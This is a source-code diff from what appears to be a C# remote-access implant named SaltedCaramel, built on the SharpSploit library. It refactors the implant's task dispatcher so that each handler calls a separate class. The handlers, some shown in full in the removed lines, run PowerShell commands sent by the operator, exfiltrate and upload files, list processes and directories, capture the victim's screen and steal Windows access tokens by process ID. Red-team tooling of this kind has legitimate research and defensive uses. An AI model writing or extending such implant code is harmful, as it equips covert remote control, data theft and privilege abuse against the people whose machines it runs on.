@@ -6,10 +6,9 @@ using SharpSploit.Generic;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
-using System.Drawing;
 using System.IO;
-using System.Linq;
-using System.Windows.Forms;
+
+using SaltedCaramel.Tasks;
 
 namespace SaltedCaramel
 {
@@ -38,125 +37,33 @@ namespace SaltedCaramel
             if (this.command == "exit")
             {
                 Debug.WriteLine("[-] DispatchTask - Tasked to exit");
-                try
-                {
-                    implant.SendComplete(this.id);
-                }
-                catch (Exception e)
-                {
-                    implant.SendError(this.id, e.Message);
-                }
-                Environment.Exit(0);
+                Exit.Execute(this, implant);
             }
             else if (this.command == "download")
             {
                 Debug.WriteLine("[-] DispatchTask - Tasked to send file " + this.@params);
-                string file = this.@params;
-                implant.SendFile(this.id, file);
+                Download.Execute(this, implant);
             }
             else if (this.command == "upload")
             {
-                JObject json = (JObject)JsonConvert.DeserializeObject(this.@params);
-                string file_id = json.Value<string>("file_id");
-                string filepath = json.Value<string>("remote_path");
-                Debug.WriteLine("[-] DispatchTask - Tasked to get file " + file_id);
-                // If file exists, don't write file
-                if (File.Exists(filepath))
-                {
-                    Debug.WriteLine($"[!] DispatchTask - ERROR: File exists: {filepath}");
-                    implant.SendError(this.id, "ERROR: File exists.");
-                }
-                else
-                    implant.GetFile(file_id, filepath, this.id);
+                Debug.WriteLine("[-] DispatchTask - Tasked to get file from server");
+                Upload.Execute(this, implant);
             }
             else if (this.command == "ps")
             {
                 Debug.WriteLine("[-] DispatchTask - Tasked to list processes");
-                SharpSploitResultList<Host.ProcessResult> processResult = Host.GetProcessList();
-                List<Dictionary<string, string>> procList = new List<Dictionary<string, string>>();
-                foreach (Host.ProcessResult item in processResult)
-                {
-                    Dictionary<string, string> proc = new Dictionary<string, string>();
-                    proc.Add("process_id", item.Pid.ToString());
-                    proc.Add("parent_process_id", item.Ppid.ToString());
-                    proc.Add("name", item.Name);
-
-                    procList.Add(proc);
-                }
-                processResult.Clear();
-
-                /* SortedList so that we get processes back sorted by PID
-                 * 
-                 * Had to put the processes in this way because it throws an error
-                 * when trying to serialize a list of procs if we don't have admin */
-                //SortedList<int, string> procs = new SortedList<int, string>();
-                /*
-                foreach (Process proc in procList)
-                {
-                    int pid = proc.Id;
-                    string name = proc.ProcessName;
-                    procs.Add(pid, name);
-                } */
-
-                TaskResponse response = new TaskResponse(JsonConvert.SerializeObject(procList), this.id);
-                implant.PostResponse(response);
-                implant.SendComplete(this.id);
+                ProcessList.Execute(this, implant);
             }
             else if (this.command == "ls")
             {
                 string path = this.@params;
                 Debug.WriteLine("[-] DispatchTask - Tasked to list directory " + path);
-                SharpSploitResultList<Host.FileSystemEntryResult> list;
-
-                try
-                {
-                    if (path != "")
-                        list = Host.GetDirectoryListing(path);
-                    else
-                        list = Host.GetDirectoryListing();
-
-                    List<Dictionary<string, string>> fileList = new List<Dictionary<string, string>>();
-
-                    foreach (Host.FileSystemEntryResult item in list)
-                    {
-                        FileInfo f = new FileInfo(item.Name);
-                        Dictionary<string, string> infoDict = new Dictionary<string, string>();
-                        try
-                        {
-                            infoDict.Add("size", f.Length.ToString());
-                            infoDict.Add("type", "file");
-                            infoDict.Add("name", f.Name);
-                            fileList.Add(infoDict);
-                        }
-                        catch
-                        {
-                            infoDict.Add("size", "0");
-                            infoDict.Add("type", "dir");
-                            infoDict.Add("name", item.Name);
-                            fileList.Add(infoDict);
-                        }
-                    }
-
-                    TaskResponse response = new TaskResponse(JsonConvert.SerializeObject(fileList), this.id);
-                    implant.PostResponse(response);
-                    implant.SendComplete(this.id);
-                }
-                catch (DirectoryNotFoundException)
-                {
-                    Debug.WriteLine($"[!] DispatchTask - ERROR: Directory not found: {path}");
-                    implant.SendError(this.id, "Error: Directory not found.");
-                }
+                DirectoryList.Execute(this, implant);
             }
             else if (this.command == "powershell")
             {
                 Debug.WriteLine("[-] DispatchTask - Tasked to run powershell");
-                string args = this.@params;
-
-                string result = Shell.PowerShellExecute(args);
-
-                TaskResponse response = new TaskResponse(JsonConvert.SerializeObject(result), this.id);
-                implant.PostResponse(response);
-                implant.SendComplete(this.id);
+                Powershell.Execute(this, implant);
             }
             else if (this.command == "rev2self")
                 Token.Revert();
@@ -170,18 +77,7 @@ namespace SaltedCaramel
             else if (this.command == "screencapture")
             {
                 Debug.WriteLine("[-] DispatchTask - Tasked to take screenshot.");
-                Rectangle bounds = Screen.GetBounds(Point.Empty);
-                Bitmap bm = new Bitmap(bounds.Width, bounds.Height);
-                Graphics g = Graphics.FromImage(bm);
-                g.CopyFromScreen(new Point(bounds.Left, bounds.Top), Point.Empty, bounds.Size);
-
-                using (MemoryStream ms = new MemoryStream())
-                {
-                    bm.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
-                    byte[] screenshot = ms.ToArray();
-
-                    implant.SendScreenshot(this.id, screenshot);
-                }
+                ScreenCapture.Execute(this, implant);
             }
             else if (this.command == "sleep")
             {
@@ -200,7 +96,7 @@ namespace SaltedCaramel
             }
             else if (this.command == "steal_token")
                 // EXPERIMENTAL - doesn't quite work yet
-                Token.StealToken(780);
+                Token.StealToken(Convert.ToInt32(this.@params));
             else if (this.command == "reset_token")
                 Token.stolenHandle = IntPtr.Zero;
         }
